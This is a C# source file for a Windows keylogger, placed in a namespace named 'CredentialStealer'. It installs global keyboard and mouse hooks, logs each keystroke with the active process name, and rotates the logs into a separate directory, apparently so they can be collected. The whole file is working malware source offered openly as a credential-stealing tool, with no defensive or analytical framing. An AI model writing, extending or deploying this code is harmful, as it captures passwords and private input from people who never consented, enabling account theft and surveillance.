using RamGecTools;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace CredentialStealer.KeyboardRecorder
{
    public class KeyLogger
    {
        private KeyboardHook keyboardHook;
        private MouseHook mouseHook;

        private StreamWriter sw;

        private int storedActivePid;

        private bool shiftOn;
        private bool capsOn;

        private KeyResolver resolver;

        private string origFileName;
        private string fileName;
        private FileInfo file;
        private string sourceDir;
        private string destDir;

       
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public KeyLogger(string fileName, string sourceDir, string destDir)
        {
            origFileName = fileName;
            
            this.fileName = UpdateFileName(origFileName);
            this.sourceDir = sourceDir;
            this.destDir = destDir;

            if (!System.IO.Directory.Exists(sourceDir))
            {
                System.IO.Directory.CreateDirectory(sourceDir);
            }
            
            if (!System.IO.Directory.Exists(destDir))
            {
                System.IO.Directory.CreateDirectory(destDir);
            }

            this.file = new FileInfo(System.IO.Path.Combine(sourceDir, this.fileName));
            
            

            keyboardHook = new KeyboardHook();
            keyboardHook.KeyDown += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyDown);
            keyboardHook.KeyUp += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyUp);
            keyboardHook.Install();

            mouseHook = new MouseHook();
            mouseHook.LeftButtonUp += new MouseHook.MouseHookCallback(LeftButtonUp);
            mouseHook.Install();

            resolver = new KeyResolver();
        }

        private void LeftButtonUp(MouseHook.MSLLHOOKSTRUCT mouseStruct)
        {
            KeyUp(KeyboardHook.VKeys.CLICKMOUSE);
        }

        public string UpdateFileName(string pathToFile)
        {
            return pathToFile + DateTime.Now.ToString("yyyyMMddHHmmssfff");
        }

        private static int GetActiveProcessId()
        {
            Process activeProcess = GetActiveProcess();
            return activeProcess != null ? activeProcess.Id : 0;
        }

        private static Process GetActiveProcess()
        {
            IntPtr hwnd = GetForegroundWindow();
            return hwnd != null ? GetProcessByHandle(hwnd) : null;
        }

        private static Process GetProcessByHandle(IntPtr hwnd)
        {
            try
            {
                uint processID;
                GetWindowThreadProcessId(hwnd, out processID);
                return Process.GetProcessById((int)processID);
            }
            catch { return null; }
        }

        private void KeyDown(KeyboardHook.VKeys key)
        {
            switch (key)
            {
                case KeyboardHook.VKeys.SHIFT:
                case KeyboardHook.VKeys.LSHIFT:
                case KeyboardHook.VKeys.RSHIFT:
                    shiftOn = true;
                    break;
                case KeyboardHook.VKeys.CAPITAL:
                    if (capsOn)
                    {
                        capsOn = false;
                    }
                    else
                    {
                        capsOn = true;
                    }
                    break;
                default:
                    break;
            }
        }

        private bool IsShiftKey(KeyboardHook.VKeys key)
        {
            bool shiftOn = false;
            switch (key)
            {
                case KeyboardHook.VKeys.SHIFT:
                case KeyboardHook.VKeys.LSHIFT:
                case KeyboardHook.VKeys.RSHIFT:
                    shiftOn = true;
                    break;
                default:
                    break;
            }
            return shiftOn;
        }

        private void KeyUp(KeyboardHook.VKeys key)
        {
            using (sw = new StreamWriter((File.Open(System.IO.Path.Combine(sourceDir, fileName), System.IO.FileMode.Append))))
            {
                //if saved active process is different from current active process,
                //start a new record of the log
                int activePid = GetActiveProcessId();
                if (activePid != storedActivePid)
                {
                    storedActivePid = activePid;

                    //end previous line, add new record to file
                    sw.Write('\n');
                    sw.Write(storedActivePid);
                    sw.Write('\t');
                    sw.Write(GetActiveProcess().ProcessName);
                    sw.Write('\t');
                }
                //if saved active process is same as current active process,
                //continue writing to same line of log
            
                sw.Write(resolver.Resolve(key, shiftOn, capsOn));
                sw.Flush();
            }
            
            if (IsShiftKey(key))
            {
                shiftOn = false;
            }

            
            if (new FileInfo(System.IO.Path.Combine(sourceDir, fileName)).Length > 1000)
            {
                CopyFileToOtherDirectory();
                fileName = UpdateFileName(origFileName);
                storedActivePid = 0;
            } 
        }

        private void CopyFileToOtherDirectory()
        {
            string sourceFile = System.IO.Path.Combine(sourceDir, fileName);
            string destFile = System.IO.Path.Combine(destDir, fileName);
            System.IO.File.Copy(sourceFile, destFile, true);
            System.IO.File.Delete(sourceFile);
        }
    }
}
